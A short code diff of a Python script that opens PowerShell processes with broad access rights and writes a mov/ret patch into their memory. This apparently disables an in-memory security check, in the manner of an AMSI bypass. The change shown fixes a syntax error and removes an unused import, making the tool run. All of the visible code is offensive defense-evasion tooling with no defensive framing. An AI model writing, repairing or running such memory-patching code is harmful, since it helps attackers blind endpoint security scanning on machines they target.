@@ -2,7 +2,7 @@ from ctypes import *
 from ctypes.wintypes import *
 import struct
 import psutil
-import time
+
 class MainSetup:
     #ProcessAccessRights directly from microsoft https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights 
     PROCC_ACCESS = 0x000F0000|0x00100000|0xFFFF
@@ -199,7 +199,7 @@ for pidx in getPowershellPids():
 
     lil_ret = struct.pack("<Q", ret_instruction)
     #write the patch to memory
-    writetomem(process_handle,mov_instruction,lil_ret
+    writetomem(process_handle,mov_instruction,lil_ret)
     #close handle
     MainSetup.KERNEL32.CloseHandle(process_handle)
     print("\n")
